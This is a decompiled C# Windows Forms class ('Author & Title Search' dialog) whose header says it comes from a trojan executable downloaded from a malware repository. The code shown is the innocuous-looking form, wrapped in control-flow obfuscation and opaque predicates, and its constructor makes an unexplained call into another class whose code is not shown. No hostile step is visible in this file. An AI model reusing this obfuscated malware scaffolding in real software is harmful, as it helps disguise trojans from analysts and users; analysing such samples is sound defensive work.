// Decompiled with JetBrains decompiler
// Type: IRefl.Wrappers.PredicateSingletonWrapper
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Services;
using ProjNet.Structs;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace IRefl.Wrappers
{
  public class PredicateSingletonWrapper : Form
  {
    private IContainer _InterceptorAdvisor;
    private GroupBox definitionAdvisor;
    private RadioButton contextAdvisor;
    private RadioButton m_PrinterAdvisor;
    private RichTextBox clientAdvisor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public PredicateSingletonWrapper()
    {
      int num1 = 3;
      if (PredicateSingletonWrapper.ResolveModel())
        goto label_3;
label_1:
      this._InterceptorAdvisor = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      goto label_6;
label_3:
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            PageAdvisorStructBuilder.PrepareCreator();
            num2 = 2;
            break;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_6;
          case 5:
            goto label_8;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_8:
      return;
label_6:
      this.InstantiateFacade();
      if (!PredicateSingletonWrapper.ResolveModel())
        return;
      num1 = 5;
      goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CallFacade(object i, EventArgs col)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitFacade(object first, EventArgs counter)
    {
      this.clientAdvisor.Clear();
      this.clientAdvisor.Text = CallbackRegistry.ChangeFacade().Text;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CreateFacade(object v, EventArgs cfg)
    {
      this.clientAdvisor.Clear();
      this.clientAdvisor.Text = CallbackRegistry.PushFacade().Text;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool usedef)
    {
      int num1 = 1;
      if (!PredicateSingletonWrapper.IncludeModel())
        goto label_6;
label_1:
      int num2 = this._InterceptorAdvisor != null ? 1 : 0;
label_3:
      if (num2 != 0)
      {
        this._InterceptorAdvisor.Dispose();
        goto label_10;
      }
      else
        goto label_11;
label_6:
      while (true)
      {
        int num3;
        switch (num1)
        {
          case 0:
          case 1:
            if (usedef)
            {
              num3 = 3;
              break;
            }
            goto label_2;
          case 2:
          case 4:
            goto label_10;
          case 3:
            goto label_1;
          case 5:
            goto label_12;
          default:
            num3 = 4;
            break;
        }
        num1 = num3;
      }
label_2:
      num2 = 0;
      goto label_3;
label_12:
      return;
label_10:
label_11:
      base.Dispose(usedef);
      num1 = 5;
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InstantiateFacade()
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 8:
            this.m_PrinterAdvisor.Location = new Point(7, 20);
            num2 = 3;
            break;
          case 1:
            this.m_PrinterAdvisor.AutoSize = true;
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto case 13;
          case 2:
            this.definitionAdvisor = new GroupBox();
            num2 = 11;
            break;
          case 3:
          case 9:
            this.m_PrinterAdvisor.Name = "noneRadioButton";
            this.m_PrinterAdvisor.Size = new Size(51, 17);
            this.m_PrinterAdvisor.TabIndex = 0;
            this.m_PrinterAdvisor.TabStop = true;
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 4;
          case 4:
            this.m_PrinterAdvisor.Text = "None";
            this.m_PrinterAdvisor.UseVisualStyleBackColor = true;
            this.m_PrinterAdvisor.CheckedChanged += new EventHandler(this.InitFacade);
            this.clientAdvisor.Location = new Point(12, 62);
            this.clientAdvisor.Name = "richTextBox";
            this.clientAdvisor.ReadOnly = true;
            this.clientAdvisor.Size = new Size(409, 232);
            num1 = 7;
            continue;
          case 5:
            this.Text = "Author & Title Search";
            this.Load += new EventHandler(this.CallFacade);
            this.definitionAdvisor.ResumeLayout(false);
            this.definitionAdvisor.PerformLayout();
            this.ResumeLayout(false);
            if (true)
            {
              num1 = 15;
              continue;
            }
            goto case 6;
          case 6:
            this.definitionAdvisor.Size = new Size(409, 44);
            this.definitionAdvisor.TabIndex = 1;
            this.definitionAdvisor.TabStop = false;
            this.definitionAdvisor.Text = "Group By:";
            this.contextAdvisor.AutoSize = true;
            this.contextAdvisor.Location = new Point(99, 20);
            num2 = 10;
            break;
          case 7:
            this.clientAdvisor.TabIndex = 2;
            this.clientAdvisor.Text = "";
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(433, 303);
            this.Controls.Add((Control) this.clientAdvisor);
            this.Controls.Add((Control) this.definitionAdvisor);
            this.Name = "QueryAuthorAndTitle";
            num1 = 5;
            continue;
          case 10:
            this.contextAdvisor.Name = "authorRadioButton";
            this.contextAdvisor.Size = new Size(56, 17);
            this.contextAdvisor.TabIndex = 1;
            this.contextAdvisor.TabStop = true;
            this.contextAdvisor.Text = "Author";
            this.contextAdvisor.UseVisualStyleBackColor = true;
            this.contextAdvisor.CheckedChanged += new EventHandler(this.CreateFacade);
            goto case 1;
          case 11:
            this.contextAdvisor = new RadioButton();
            this.m_PrinterAdvisor = new RadioButton();
            this.clientAdvisor = new RichTextBox();
            this.definitionAdvisor.SuspendLayout();
            if (true)
            {
              num1 = 13;
              continue;
            }
            goto case 2;
          case 12:
            this.definitionAdvisor.Location = new Point(12, 12);
            num1 = 14;
            continue;
          case 13:
            this.SuspendLayout();
            this.definitionAdvisor.Controls.Add((Control) this.contextAdvisor);
            this.definitionAdvisor.Controls.Add((Control) this.m_PrinterAdvisor);
            int num3 = 12;
            num1 = PredicateSingletonWrapper.IncludeModel() ? num3 : num3;
            continue;
          case 14:
            this.definitionAdvisor.Name = "groupByBox";
            num2 = 6;
            break;
          case 15:
            goto label_17;
          default:
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 12;
        }
        num1 = num2;
      }
label_17:;
    }

    internal static bool ResolveModel() => true;

    internal static bool IncludeModel() => false;
  }
}
